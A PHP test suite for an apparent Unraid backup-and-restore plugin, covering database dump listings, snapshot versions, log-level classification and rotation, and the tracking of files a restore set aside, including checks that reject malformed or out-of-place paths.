    $put('snapA/apps/EmbyServer/manifest.json', $emby('20261005-1600', 414000000));
    $t06 = rsRunTime('20261006-1600');
    $t0602 = rsRunTime('20261006-0200');
    $t05 = rsRunTime('20261005-1600');

    $pk = rsPackages("$tmp/place");
    $by = array_column($pk['apps'], null, 'id');
    same('restore databases: the packages by name', ['chat', 'EmbyServer', 'web', 'zz-uso-test-db'], array_column($pk['apps'], 'id'));
    same('restore databases: dumps as the real manifests list them (a MariaDB dump names its database)',
        [[$mdb, 'mariadb', 'usotest', 1405, $t06, false], [$pg, 'postgres', null, 2291, $t06, false]],
        array_map(fn ($d) => [$d['file'], $d['type'], $d['db'], $d['bytes'], $d['time'], $d['kept']], $by['zz-uso-test-db']['dumps']));
    same('restore databases: a failed dump keeps the last good one', [true, $t05], [$by['chat']['dumps'][0]['kept'], $by['chat']['dumps'][0]['time']]);
    same('restore databases: the media server\'s copies that are there (not one the run found missing)',
        [['db/sqlite_EmbyServer_library.db', 414433280, $t06], ['db/sqlite_EmbyServer_users.db', 40960, $t06]],
        array_map(fn ($q) => [$q['file'], $q['bytes'], $q['time']], $by['EmbyServer']['sqlite']));

    // earlier nights: the snapshots of the backup place, newest first
    $place = ['places' => [['snaps' => [['id' => 'snapNew', 'time' => $t06 + 1800, 'path' => "$tmp/snapNew"], ['id' => 'snapB', 'time' => $t0602 + 3600, 'path' => "$tmp/snapB"],
                                         ['id' => 'snapA', 'time' => $t05 + 1800, 'path' => "$tmp/snapA"]]]]];
    $vt = rsVersionList($place, 'app', 'zz-uso-test-db', '20261006-1600');
    $ve = rsVersionList($place, 'app', 'EmbyServer', '20261006-1600');
    same('restore databases: earlier packages of an app with dumps', [['snapNew', []], ['snapB', []], ['snapA', []]], array_map(fn ($v) => [$v['snap'], $v['sqlite']], $vt));
    same('restore databases: earlier nights carry the SQLite copies (no paths on the server), one package once',
        [['snapNew', [['container' => 'EmbyServer', 'file' => 'db/sqlite_EmbyServer_library.db', 'bytes' => 414433280, 'time' => $t06, 'kept' => false],
                      ['container' => 'EmbyServer', 'file' => 'db/sqlite_EmbyServer_users.db', 'bytes' => 40960, 'time' => $t06, 'kept' => false]]],
         ['snapB', [['container' => 'EmbyServer', 'file' => 'db/sqlite_EmbyServer_library.db', 'bytes' => 414000000, 'time' => $t05, 'kept' => false],
                    ['container' => 'EmbyServer', 'file' => 'db/sqlite_EmbyServer_users.db', 'bytes' => 40960, 'time' => $t05, 'kept' => false]]]],
        array_map(fn ($v) => [$v['snap'], $v['sqlite']], $ve));

    // where a package is kept: the app's own Kopia source, else like the backup place's share
    @mkdir($tmp, 0700, true);
    $ini = function (string $text) use ($tmp): array {
        file_put_contents("$tmp/s.ini", $text);
        return backupReadSettings("$tmp/s.ini");
    };
    $p = '/mnt/user/UnraidSecretaryOffice/backup/apps/zz-uso-test-db';
    $snap = $ini("[general]\ndumps_share = UnraidSecretaryOffice\n[kopia]\nenabled = yes\n[share \"UnraidSecretaryOffice\"]\nmode = snapshot\n");
    $kop = $ini("[general]\ndumps_share = UnraidSecretaryOffice\n[kopia]\nenabled = yes\n[share \"UnraidSecretaryOffice\"]\nmode = kopia\n");
    same('restore databases: a package kept only locally, in Kopia with its own source, in Kopia with the share, not known',
        ['local', 'offsite', 'offsite', null], [rsPackageProtection($p, false, $snap), rsPackageProtection($p, true, $snap), rsPackageProtection($p, false, $kop), rsPackageProtection($p, false, [])]);

    // the page's list, under node
    $node = trim((string) shell_exec('command -v node 2>/dev/null')) ?: (is_executable('/usr/local/bin/node') ? '/usr/local/bin/node' : '');
    if ($node === '') {
        check('restore databases page: node is missing here - skipped', true);
        exec('rm -rf ' . escapeshellarg($tmp));
        return;
    }
    $apps = array_map(fn ($a) => $a + ['present' => true, 'package_protection' => 'offsite'], $pk['apps']);
    file_put_contents("$tmp/in.json", json_encode(['state' => ['apps' => $apps, 'place' => ['found' => true, 'snaps' => 3]],
                                                    'versions' => ['zz-uso-test-db' => $vt, 'EmbyServer' => $ve, 'chat' => [], 'web' => []]]));
    $js = <<<'JS'
const fs = require('fs');
globalThis.OFFICE_DESK_TESTS = {};
const T = (k, p) => k + (p ? ' ' + JSON.stringify(p) : '');
globalThis.Office = { scope: () => T, t: T, el: () => ({}), store: () => null, desk: () => {}, has: () => false,
  fmt: { size: (b) => b + ' B', relative: (t) => 'rel ' + t, date: (t) => 'date ' + t } };
(0, eval)(fs.readFileSync(process.argv[2], 'utf8'));
const r = OFFICE_DESK_TESTS.restore;
const input = JSON.parse(fs.readFileSync(process.argv[3], 'utf8'));
r.setState(input.state);
const groups = r.dbGroups();
const out = {
  groups: groups.map((g) => [g.app.id, g.items.map((x) => [x.key, x.engine, r.dbName(x), x.container, x.bytes, x.time, x.kept])]),
  tile: r.tileLine('dbs'),
  requests: groups.flatMap((g) => g.items.map((x) => r.dbRequest(g.app, x, x.kind === 'sqlite' ? 'snapB' : null))),
  earlier: Object.fromEntries(groups.flatMap((g) => g.items.map((x) => [x.key, r.earlierOf(input.versions[g.app.id], x).map((e) => [e.snap, e.time, e.bytes, e.path])]))),
};
r.setState({ ...input.state, apps: input.state.apps.map((a) => ({ ...a, dumps: [], sqlite: [] })) });
out.none = [r.dbGroups().length, r.tileLine('dbs')];
console.log(JSON.stringify(out));
JS;
    file_put_contents("$tmp/t.js", $js);
    $cmd = escapeshellarg($node) . ' ' . escapeshellarg("$tmp/t.js") . ' ' . escapeshellarg(OFFICE_WEB . '/desks/restore/desk.js') . ' ' . escapeshellarg("$tmp/in.json") . ' 2>&1';
    $raw = (string) shell_exec($cmd);
    $r = json_decode($raw, true);
    if (!is_array($r)) {
        check('restore databases page: ran under node', false, $raw);
        exec('rm -rf ' . escapeshellarg($tmp));
        return;
    }
    $name = fn (string $engine, string $n) => 'dbs.name ' . json_encode(['engine' => "dbs.engine.$engine", 'name' => $n]);
    same('restore databases page: per app (none without databases), a dump each, one media server\'s copies as one entry',
        [['chat', [['db:chat:db/mongodb_chat-mongo.archive.gz', 'mongodb', $name('mongodb', 'dbs.all'), 'chat-mongo', 500, $t05, true]]],
         ['EmbyServer', [['sq:EmbyServer:EmbyServer', 'sqlite', $name('sqlite', 'library.db, users.db'), 'EmbyServer', 414433280 + 40960, $t06, false]]],
         ['zz-uso-test-db', [["db:zz-uso-test-db:$mdb", 'mariadb', $name('mariadb', 'usotest'), 'zz-uso-test-db-mdb', 1405, $t06, false],
                             ["db:zz-uso-test-db:$pg", 'postgres', $name('postgres', 'dbs.all'), 'zz-uso-test-db-pg', 2291, $t06, false]]]],
        $r['groups']);
    same('restore databases page: the tile - dumps, copies, the newest', ['tile.dbs_dumps {"n":3} · tile.dbs_copies {"n":2}', "rel $t06"], $r['tile']);
    same('restore databases page: nothing in the packages', [0, ['tile.dbs_none', '']], $r['none']);
    same('restore databases page: «Restore…» asks for the existing plans (an earlier night with its snapshot)',
        [['kind' => 'db', 'app' => 'chat', 'file' => 'db/mongodb_chat-mongo.archive.gz'], ['kind' => 'sqlite', 'app' => 'EmbyServer', 'container' => 'EmbyServer', 'version' => 'snapB'],
         ['kind' => 'db', 'app' => 'zz-uso-test-db', 'file' => $mdb], ['kind' => 'db', 'app' => 'zz-uso-test-db', 'file' => $pg]], $r['requests']);
    same('restore databases page: earlier nights - each copy once, never the one listed, newest first',
        ['db:chat:db/mongodb_chat-mongo.archive.gz' => [],
         'sq:EmbyServer:EmbyServer' => [['snapB', $t05, 414000000 + 40960, "$tmp/snapB/apps/EmbyServer/db"]],
         "db:zz-uso-test-db:$mdb" => [['snapB', $t0602, 1390, "$tmp/snapB/apps/zz-uso-test-db/$mdb"], ['snapA', $t05, 1300, "$tmp/snapA/apps/zz-uso-test-db/$mdb"]],
         "db:zz-uso-test-db:$pg" => [['snapB', $t05, 2200, "$tmp/snapB/apps/zz-uso-test-db/$pg"]]],
        $r['earlier']);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Ms. Protocolli's tour: what counts as an error or a warning (own level,
 * words, what doesn't count), similar lines as one kind, times at the start
 * of a line, reading a file since the last tour (offset, rotation by inode,
 * the cap), the team lead's /var/log check — and that the page colours by
 * the same patterns as the tour counts.
 */
function testLogsTour(): void
{
    $levels = [
        'Oct  5 20:27:28 Tower sshd-session[2940377]: error: connect_to 127.0.0.1 port 18080: failed.' => 'error',
        '2026/10/04 23:21:54 [error] 42368#42368: *817496 open() "/x/question.png" failed (2: No such file)' => 'error',
        't=2026-10-05T22:41:29+02:00 level=info msg="Database locked, sleeping then retrying" error="database is locked"' => '',
        'time="2026-10-05T20:00:00Z" level=warning msg="cleanup failed"' => 'warn',
        '{"level":"warn","ts":1791229645.04,"msg":"HTTP/3 skipped"}' => 'warn',
        '2026-10-04 19:23:53,729 | INFO | Exclude-Liste: 3 Einträge, 0 Fehler' => '',
        '2026-10-04 19:23:53,729 | ERROR | Emby antwortet nicht' => 'error',
        '2026-10-05 21:04:33.953+0000: 268179: error : virNetSocketReadWire:1782 : End of file' => 'error',
        '2026-10-05 20:01:51.778+0000: 268180: warning : qemuDomainObjTaintMsg:5727 : Domain id=12' => 'warn',
        '[11:15:34 WARN VmsService]: Initial hypervisor connection failed: Libvirt is not running.' => 'warn',
        '[05-Oct-2026 08:24:47 Europe/Berlin] PHP Warning:  file_get_contents(x): Failed to open stream' => 'warn',
        '[05-Oct-2026 20:52:44 Europe/Berlin] PHP Parse error:  Unclosed \'{\' on line 378' => 'error',
        '[05-Oct-2026 20:52:44 Europe/Berlin] PHP Deprecated:  something failed' => '',
        '2026-10-05T19:42:42Z INF Retrying connection in up to 2s connIndex=3' => '',
        '2026-10-05T19:42:42Z ERR Connection terminated connIndex=3' => 'error',
        '1:C 05 Oct 2026 20:34:07.634 # WARNING Memory overcommit must be enabled! a background save may fail' => 'warn',
        '[Nest] 218  - 10/05/2026, 9:47:26 PM     LOG Showing log, warn, error, fatal messages' => '',
        '2026-10-05 22:52:38  Check done: 0 errors, 0 warnings, 0 notes.' => '',
        'Imported mempool transactions from file: 45101 succeeded, 0 failed, 0 expired' => '',
        'ENDE: Sat Oct  3 20:42:11 CEST 2026 - Exit Code: 23' => 'error',
        'ENDE: Sat Oct  3 20:42:11 CEST 2026 - Exit Code: 0' => '',
        '>f+++++++++ Season.04/Gossip.Girl.-.S04E14.-.Panic.Roommate.mkv' => '',
        'rsync error: received SIGUSR1 (code 19) at main.c(1622) [generator=3.4.4]' => 'error',
        'kernel: ata3.00: failed command: READ FPDMA QUEUED' => 'error',
        'kernel: BTRFS info (device sdb1): Call Trace: x' => 'error',
        'nginx: [warn] duplicate MIME type "text/html"' => 'warn',
        'Connection timed out while waiting' => 'warn',
        '2026-10-05 22:24:35  WARNUNG: [nextcloud] Verify: 1 Abweichungen' => 'warn',
        'Gather: FEHLER beim Verschieben' => 'error',
        'Started Daily Cleanup of Temporary Directories.' => '',
        'nginx: open() "/var/log/nginx/error.log" for writing' => '',
        '[compose] Pulling images' => '',
    ];
    foreach ($levels as $line => $want) {
        same('logs level: ' . substr($line, 0, 60), $want, logsLevel($line));
    }

    // similar lines are one kind: times, PIDs, connection numbers, addresses, ids don't matter
    $kind = fn (string $l) => logsNormalize($l, logsLineTime($l)[1]);
    same('logs kind: nginx loop', $kind('Oct  4 23:21:47 Tower nginx: 2026/10/04 23:21:47 [error] 42368#42368: *814029 open() "/q.png" failed, client: 192.168.7.61'),
        $kind('Oct  5 01:02:03 Tower nginx: 2026/10/05 01:02:03 [error] 1234#1234: *9 open() "/q.png" failed, client: 10.0.0.2'));
    same('logs kind: container ids and UUIDs', $kind('2026-10-05T20:33:38.694584352Z removing 7f505d74adb07ef9bf9bc20ec4652a38d4daf85a for 9b3e9c65-84b4-2410-470b-8f719c38ea21'),
        $kind('2026-10-06T01:00:00.1Z removing aba6f774f5ad7603936e9b3c6d28853ce5537f2e for 1734176c-cd39-de65-1437-8fe971a30dd6'));
    check('logs kind: another message is another kind', $kind('Oct  5 01:02:03 Tower sshd[1]: error: connect_to 127.0.0.1 port 18080: failed.')
        !== $kind('Oct  5 01:02:03 Tower sshd[1]: Read error from remote host 127.0.0.1 port 18080: Connection reset by peer'));

    // ... nor do file names and paths: quoted, absolute (also with spaces), relative, Samba's "for <name> with NT_STATUS_…"
    $samePairs = [
        'Samba inherit_new_acl' => ['Oct  5 12:00:00 Tower smbd[12]:   open_file_ntcreate: inherit_new_acl failed for Fotos/2024/IMG_0001.jpg with NT_STATUS_ACCESS_DENIED',
                                    'Oct  5 12:30:00 Tower smbd[99]:   open_file_ntcreate: inherit_new_acl failed for Dokumente/Steuer 2025/Beleg Nr. 7.pdf with NT_STATUS_ACCESS_DENIED'],
        'Samba [file]'          => ['Oct  5 12:00:00 Tower smbd[12]:   streams_xattr_pwrite: Write to xattr [user.DosStream.WofCompressedData:$DATA] on file [Windows/System32/fr-FR/wmerror.dll.mui] exceeds maximum',
                                    'Oct  5 12:00:01 Tower smbd[12]:   streams_xattr_pwrite: Write to xattr [user.DosStream.WofCompressedData:$DATA] on file [Windows/SysWOW64/ErrorDetails.dll] exceeds maximum'],
        'quoted path'           => ['Oct  4 23:21:47 Tower nginx: 2026/10/04 23:21:47 [error] 1#1: *1 open() "/usr/local/emhttp/a/question.png" failed (2: No such file or directory), request: "GET /a/question.png HTTP/1.1", referrer: "http://192.168.7.59/Dashboard"',
                                    'Oct  4 23:21:48 Tower nginx: 2026/10/04 23:21:48 [error] 1#1: *2 open() "/usr/local/emhttp/b/c/logo.svg" failed (2: No such file or directory), request: "GET /b/c/logo.svg?v=3 HTTP/1.1", referrer: "http://tower.local/Docker"'],
        'quoted file name'      => ["[05-Oct-2026 08:24:47 Europe/Berlin] PHP Warning:  file_get_contents('state.json'): Failed to open stream",
                                    "[05-Oct-2026 08:24:48 Europe/Berlin] PHP Warning:  file_get_contents('/tmp/other folder/x.json'): Failed to open stream"],
        'absolute path'         => ["Oct  5 03:40:01 Tower move: create_parent: /mnt/master/Serien/Gabby's.Dollhouse.(2019)/Season.04 error: No space left on device",
                                    'Oct  5 03:40:02 Tower move: create_parent: /mnt/master/Serien/Slow.Horses/Season.01 error: No space left on device'],
        'absolute with spaces'  => ['Oct  5 03:40:01 Tower move: move: /mnt/cache/Filme/Der Name der Rose (1986)/Der Name der Rose.mkv No space left on device',
                                    'Oct  5 03:40:02 Tower move: move: /mnt/cache/Serien/Slow.Horses/Season.04/Slow.Horses.-.S04E01.mkv No space left on device'],
    ];
    foreach ($samePairs as $what => [$a, $b]) {
        same("logs kind: $what", $kind($a), $kind($b));
    }
    $otherPairs = [
        'Samba: another status' => ['Oct  5 12:00:00 Tower smbd[12]:   inherit_new_acl failed for a/b.txt with NT_STATUS_ACCESS_DENIED',
                                    'Oct  5 12:00:00 Tower smbd[12]:   inherit_new_acl failed for a/b.txt with NT_STATUS_DISK_FULL'],
        'quoted words'          => ['time="2026-10-05T20:00:00Z" level=warning msg="cleanup failed"', 'time="2026-10-05T20:00:00Z" level=warning msg="restore failed"'],
        'the words after a path' => ['Oct  5 03:40:01 Tower move: create_parent: /mnt/a/b error: No space left on device',
                                    'Oct  5 03:40:01 Tower move: create_parent: /mnt/a/b error: Read-only file system'],
    ];
    foreach ($otherPairs as $what => [$a, $b]) {
        check("logs kind: $what stays apart", $kind($a) !== $kind($b), $kind($a));
    }
    same('logs kind: dates, HTTP/1.1, I/O and a lone slash are no paths', 'on 2026/10/04 via HTTP/1.1: I/O error, files / folders',
        logsNormalizePaths('on 2026/10/04 via HTTP/1.1: I/O error, files / folders'));
    same('logs kind: a quoted message stays', 'msg="Database locked, sleeping then retrying" [error] "HTTP/3 skipped"',
        logsNormalizePaths('msg="Database locked, sleeping then retrying" [error] "HTTP/3 skipped"'));

    // times at the start of a line
    $times = [
        '2026-10-05 20:52:37.064+0000: 268179: error : x' => '2026-10-05 22:52:37',
        '2026-10-05T20:52:37.123456789Z line'             => '2026-10-05 22:52:37',
        '2026-10-05 22:52:15  Backup: started'             => '2026-10-05 22:52:15',
        '2026/10/04 23:21:54 [error] x'                    => '2026-10-04 23:21:54',
        '[Sun Oct  5 22:52:31 2026] usb 1-1: new device'   => '2026-10-05 22:52:31',
        '[05-Oct-2026 18:52:44 UTC] PHP Parse error: x'    => '2026-10-05 20:52:44',
        '[2026/10/05 11:12:13.123456,  0] ../../source3/smbd/server.c:1736(main)' => '2026-10-05 11:12:13',
    ];
    foreach ($times as $line => $want) {
        [$t] = logsLineTime($line);
        same('logs time: ' . substr($line, 0, 30), $want, $t === null ? null : date('Y-m-d H:i:s', $t));
    }
    [$t, $len] = logsLineTime('Oct  5 22:52:00 Tower kernel: x');
    same('logs time: syslog (this year, or last year for December read in January)', [true, 16], [$t !== null && $t <= time() + 86400, $len]);
    same('logs time: none', [null, 0], logsLineTime('rsync error: some files were not transferred'));

    // a sample never ends inside a UTF-8 character
    same('logs cut: whole characters only', ['aaaaaaaaa', true], logsCut(str_repeat('a', 9) . 'ä' . 'bcd', 10));
    same('logs cut: short lines stay', ['abc', false], logsCut('abc', 10));

    // a file since the last tour: from its offset, rotated (the rest of <file>.1, found by inode), the first tour's 24 hours
    $tmp = sys_get_temp_dir() . '/office-tests-logs-' . getmypid();
    @mkdir($tmp, 0700, true);
    $log = "$tmp/syslog";
    $old = date('M j H:i:s', time() - 2 * 86400);
    $new = date('M j H:i:s', time() - 600);
    file_put_contents($log, "$old Tower kernel: I/O error, dev sdb\n$new Tower sshd[1]: error: one\n$new Tower sshd[2]: error: one\n$new Tower ok\n");
    $src = ['group' => 'unraid', 'label' => 'syslog', 'kind' => 'file', 'target' => $log, 'param' => ''];
    $sources = ['syslog' => $src, 'syslog.1' => ['target' => "$log.1"] + $src];
    $mem = [];
    $e = logsTourFileSource('syslog', $src, null, time() - 86400, time() - 86400, $sources, $mem);
    same('logs tour: the first tour counts the last 24 hours, similar lines as one kind', [2, 1, 2, 1],
        [$e['errors'], $e['kinds'], $e['groups'][0]['count'] ?? null, $e['groups'][0]['back'] ?? null]);
    same('logs tour: remembers where the file ended', filesize($log), $mem['syslog']['size'] ?? null);
    file_put_contents($log, "$new Tower smbd[3]: warning: two\n$new Tower half a li", FILE_APPEND);
    $mem2 = [];
    $e = logsTourFileSource('syslog', $src, $mem['syslog'], null, time() - 3600, $sources, $mem2);
    same('logs tour: the next tour reads only what came, whole lines', [0, 1, 1], [$e['errors'], $e['warnings'], $e['lines']]);
    check('logs tour: an unfinished line waits for the next tour', ($mem2['syslog']['size'] ?? PHP_INT_MAX) < filesize($log));
    rename($log, "$log.1");
    file_put_contents("$log.1", "ne\n$new Tower smbd[4]: error: three\n", FILE_APPEND);
    file_put_contents($log, "$new Tower smbd[5]: error: four\n");
    $mem3 = [];
    $e = logsTourFileSource('syslog', $src, $mem2['syslog'], null, time() - 3600, $sources, $mem3);
    $srcs = array_values(array_unique(array_column($e['groups'], 'src')));
    sort($srcs);
    same('logs tour: rotated — the rest of the old file and the new one', [true, 2, ['syslog', 'syslog.1']], [$e['rotated'], $e['errors'], $srcs]);
    file_put_contents($log, str_repeat("$new Tower x: nothing to see\n", 160000), FILE_APPEND);
    $e = logsTourFileSource('syslog', $src, $mem3['syslog'], null, time() - 3600, $sources, $mem);
    same('logs tour: never more than the cap, the newest part', [true, true], [$e['partial'], $e['skipped'] > 0 && $e['lines'] * 30 <= LOGS_TOUR_BYTES]);
    exec('rm -rf ' . escapeshellarg($tmp));

    // the team lead: /var/log over 80 % still to do, over 60 % recommended; a /var/log that isn't a disk of its own: nothing
    $v = fn (int $pct, bool $own = true) => ['ok' => true, 'own' => $own, 'total' => 100 << 20, 'used' => $pct << 20, 'pct' => $pct];
    same('logs check: levels', [['required', true], ['recommended', false], ['required', false], [], []],
        array_map(fn ($c) => $c ? [$c[0]['level'], $c[0]['ok']] : [],
            [logsChecks($v(15)), logsChecks($v(65)), logsChecks($v(85)), logsChecks($v(95, false)), logsChecks(['ok' => false])]));

    // the page colours lines by the same patterns as the tour counts them
    $js = (string) file_get_contents(OFFICE_DIR . '/public/desks/logs/desk.js');
    foreach (['OWN_LEVEL' => LOGS_OWN_LEVEL, 'OWN_UPPER' => LOGS_OWN_UPPER, 'NOT_COUNTED' => LOGS_NOT_COUNTED, 'ERROR' => LOGS_ERROR, 'WARN' => LOGS_WARN] as $name => $php) {
        preg_match('#^const ' . $name . ' = /(.*)/[gi]*;$#m', $js, $m);
        same("logs: desk.js $name is the agent's", substr($php, 1, strrpos($php, '/') - 1), $m[1] ?? null);
    }
    preg_match('#const LEVEL_NAMES = \{(.*?)\};#s', $js, $m);
    preg_match_all("#'?([a-z][a-z ]*)'?: '(error|warn|)'#", $m[1] ?? '', $pairs, PREG_SET_ORDER);
    $names = array_column($pairs, 2, 1);
    $want = LOGS_LEVEL_NAMES;
    ksort($names);
    ksort($want);
    same("logs: desk.js LEVEL_NAMES are the agent's", $want, $names);
}

/** Ms. Dustdevil's «Where is what»: which services of a compose file build their own image (her rebuild tip) */
/**
 * Ms. Dustdevil's room for Mr. Restori's leftovers: what his journals say he put aside (only in exactly his
 * shapes, with the restore's own time), what his «Put back» still needs, his journals only from his own
 * folder, her storeroom on the leftover's own filesystem, and the way back from it.
 */
function testLeftovers(): void
{
    $u = fn (array $j) => array_map(fn ($x) => [$x['path'], $x['dataset'], $x['what'], $x['back']], clLeftoverUnits($j));
    // shapes as on nostromo (data/restore/<id>/journal.json)
    same('leftovers: a copy next to the live one', [['/mnt/hive/drop/shares.restored-20261006-150008', null, 'restored', false]],
        $u(['id' => '20261006-150008-2814', 'kind' => 'files', 'result' => 'ok', 'putback' => null, 'aside' => [],
            'steps' => [['do' => 'copy', 'to' => '/mnt/hive/drop/shares.restored-20261006-150008', 'dataset' => null]]]));
    $vm = 'master/domains/Win.aside-20261006-175854';
    same('leftovers: a swap — the live one aside (a dataset, his way back), the copy (moved into place: existence decides)',
        [['/mnt/master/domains/Win.aside-20261006-175854', $vm, 'aside', true], ['/mnt/master/domains/Win.restored-20261006-175854', 'master/domains/Win.restored-20261006-175854', 'restored', false]],
        $u(['id' => '20261006-175854-9b26', 'kind' => 'files', 'result' => 'ok', 'putback' => null,
            'steps' => [['do' => 'copy', 'to' => '/mnt/master/domains/Win.restored-20261006-175854', 'dataset' => 'master/domains/Win.restored-20261006-175854'],
                        ['do' => 'aside', 'path' => '/mnt/master/domains/Win', 'to' => '/mnt/master/domains/Win.aside-20261006-175854']],
            'aside' => [['from' => '/mnt/master/domains/Win', 'to' => '/mnt/master/domains/Win.aside-20261006-175854', 'dataset' => 'master/domains/Win', 'to_dataset' => $vm]]]));
    same('leftovers: a database put back already — its safety dumps\' folder and the folder aside are no way back any more',
        [['/mnt/user/UnraidSecretaryOffice/backup/restore/zz/20261006-172818', null, 'safety', false], ['/mnt/master/appdata/zz/pg.aside-20261006-172818', null, 'aside', false]],
        $u(['id' => '20261006-172818-56e7', 'kind' => 'db', 'result' => 'ok', 'putback' => ['id' => '20261006-173611-d33f', 'result' => 'ok'], 'steps' => [],
            'aside' => [['from' => 'db:zz-pg', 'to' => '/mnt/user/UnraidSecretaryOffice/backup/restore/zz/20261006-172818/postgres_zz-pg.sql.gz', 'what' => 'safety_dump'],
                        ['from' => 'db:zz-mdb', 'to' => '/mnt/user/UnraidSecretaryOffice/backup/restore/zz/20261006-172818/mariadb_zz.sql.gz', 'what' => 'safety_dump'],
                        ['from' => '/mnt/master/appdata/zz/pg', 'to' => '/mnt/master/appdata/zz/pg.aside-20261006-172818', 'dataset' => null, 'to_dataset' => null]]]));
    same('leftovers: what «Put back» set aside', [['/mnt/master/appdata/zz/pg.putback-20261006-173611', null, 'putback', false]],
        $u(['id' => '20261006-173611-d33f', 'kind' => 'putback', 'result' => 'ok', 'putback' => null, 'steps' => [],
            'aside' => [['from' => '/mnt/master/appdata/zz/pg', 'to' => '/mnt/master/appdata/zz/pg.putback-20261006-173611', 'dataset' => null, 'to_dataset' => null]]]));
    same('leftovers: templates on the flash (one folder for the time), a compose file elsewhere, a VM\'s configuration',
        [['/boot/config/_UnraidSecretaryOffice-restore/20261007-090000', null, 'flash', true], ['/mnt/user/appdata/x/compose.yml.restored-aside-20261007-090000', null, 'file_aside', true],
         ['/etc/libvirt/_UnraidSecretaryOffice-restore/20261007-090000', null, 'libvirt', true]],
        $u(['id' => '20261007-090000-0a1b', 'kind' => 'config', 'result' => 'failed', 'putback' => ['result' => 'refused'], 'steps' => [],
            'aside' => [['from' => '/boot/config/plugins/dockerMan/templates-user/my-a.xml', 'to' => '/boot/config/_UnraidSecretaryOffice-restore/20261007-090000/plugins/dockerMan/templates-user/my-a.xml'],
                        ['from' => '/boot/config/plugins/compose.manager/projects/x/compose.yaml', 'to' => '/boot/config/_UnraidSecretaryOffice-restore/20261007-090000/plugins/compose.manager/projects/x/compose.yaml'],
                        ['from' => '/mnt/user/appdata/x/compose.yml', 'to' => '/mnt/user/appdata/x/compose.yml.restored-aside-20261007-090000'],
                        ['from' => 'vm:Win', 'to' => '/etc/libvirt/_UnraidSecretaryOffice-restore/20261007-090000/Win/domain.xml', 'what' => 'xml']]]));
    same('leftovers: never another shape — another time, none, unfilled, outside /mnt, «..», a dump elsewhere, a dataset of another name', [['/mnt/a/b/ok.aside-20261007-090000', null, 'aside', false]],
        $u(['id' => '20261007-090000-0a1b', 'kind' => 'db', 'result' => 'refused', 'steps' => [['do' => 'copy', 'to' => '/mnt/a/b/c.restored-20261001-000000']],
            'aside' => [['to' => '/mnt/a/b/c.aside-20261001-000000'], ['to' => '/mnt/a/b/c'], ['to' => '/mnt/a/b/c.aside-{T}'], ['to' => '/tmp/c.aside-20261007-090000'],
                        ['to' => '/mnt/a/../b/c.aside-20261007-090000'], ['to' => '/mnt/a/b/x.sql.gz', 'what' => 'safety_dump'], ['to' => "/mnt/a/b/c.aside-20261007-090000\n"],
                        ['to' => '/mnt/a/b/ok.aside-20261007-090000', 'to_dataset' => 'a/b/other'], ['to' => '/boot/config/_UnraidSecretaryOffice-restore/20261001-000000/x']]]));
    same('leftovers: what «Put back» can still undo', [true, true, false, false, false, true],
        array_map('clRestoreUndoable', [['kind' => 'db', 'result' => 'ok'], ['kind' => 'files', 'result' => 'interrupted', 'putback' => ['result' => 'refused']],
            ['kind' => 'db', 'result' => 'ok', 'putback' => ['result' => 'failed']], ['kind' => 'putback', 'result' => 'ok'], ['kind' => 'kopia', 'result' => 'ok'],
            ['kind' => 'vm', 'result' => 'warnings']]));

    // his journals: only from his own folder, only his own files
    $tmp = hardeningTmp('leftovers');
    $dir = "$tmp/restore";
    $journal = function (string $id, array $j, int $uid = 0) use ($dir): void {
        @mkdir("$dir/$id", 0700, true);
        file_put_contents("$dir/$id/journal.json", json_encode(['id' => $id] + $j));
        chmod("$dir/$id/journal.json", 0600);
        chown("$dir/$id/journal.json", $uid);
    };
    $journal('20261006-150008-2814', ['kind' => 'files']);
    $journal('20261006-160000-aaaa', ['kind' => 'db'], 99);
    $journal('20261006-170000-bbbb', ['kind' => 'db', 'id' => 'x']);
    $journal('not-a-restore', ['kind' => 'db']);
    file_put_contents("$dir/20261006-170000-bbbb/journal.json", json_encode(['id' => '20261006-999999-ffff', 'kind' => 'db']));
    chmod($dir, 0700);
    same('journals: only his own (root\'s, its own id), newest first', ['20261006-150008-2814'], array_column(clRestoreJournals($dir), 'id'));
    chmod($dir, 0777);
    same('journals: a folder others may write in — none', [], clRestoreJournals($dir));
    unset($GLOBALS['clJournals']);

    // her storeroom on the leftover's own filesystem, inside its share; the way back only to his places
    $top = "$tmp/mnt/pool/share";
    mkdir("$top/app/db", 0755, true);
    same('storeroom: at the share\'s top on the same filesystem', "$top/" . CL_TRASH, clLeftoverTrash("$top/app/db/pg.aside-20261006-172818", $top));
    same('storeroom: never outside the share, nothing where its folder is gone', [null, null],
        [clLeftoverTrash("$tmp/mnt/pool/other/x.aside-20261006-172818", $top), clLeftoverTrash("$top/gone/x.aside-20261006-172818", $top)]);
    same('way back: to where he leaves things, on the storeroom\'s own filesystem', ['/mnt/hive/drop', '/boot/config/' . CL_RESTORE_ASIDE, '', '', ''],
        [clLeftoverHome('/mnt/hive/drop/shares.restored-20261006-150008', '/mnt/hive/drop/' . CL_TRASH),
         clLeftoverHome('/boot/config/' . CL_RESTORE_ASIDE . '/20261006-150008', '/boot/config/' . CL_TRASH),
         clLeftoverHome('/mnt/hive/drop/shares', '/mnt/hive/drop/' . CL_TRASH),
         clLeftoverHome('/mnt/hive/other/shares.restored-20261006-150008', '/mnt/hive/drop/' . CL_TRASH),
         clLeftoverHome('/etc/libvirt/' . CL_RESTORE_ASIDE . '/20261006-150008', '/boot/config/' . CL_TRASH)]);
    hardeningRm($tmp);

    // the page's words for every kind of leftover and restore
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true) ?: [];
    foreach (['aside', 'putback', 'restored', 'file_aside', 'flash', 'libvirt', 'safety'] as $w) {
        check("leftovers: words for $w", isset($en["lo.what.$w"], $en["lo.what.{$w}_text"]));
    }
    foreach (['db', 'sqlite', 'files', 'config', 'vm', 'kopia', 'putback'] as $k) {
        check("leftovers: words for a restore of kind $k", isset($en["lo.kind.$k"]));
    }

    // a dataset is as big as ZFS counts it with its snapshots — nostromo's VM folder set aside: used 17.3 GB, referenced 96 KB,
    // find saw «0 B»; the other rooms (domains, appdata, the storeroom's parked datasets) the same
    $aside = 'master/domains/VM.aside-20261006-175854';
    $calls = [];
    $zfs = function (array $cmd) use (&$calls, $aside): array {
        $calls[] = $cmd;
        return [1, "$aside\t17299173376\t17299075072\nother/x\t5\t0\nmaster/domains/odd\tx\t1\n", "cannot open 'pool/gone': dataset does not exist\n"];
    };
    $space = clZfsSpace([$aside, 'pool/gone', 'master/domains/odd'], $zfs);
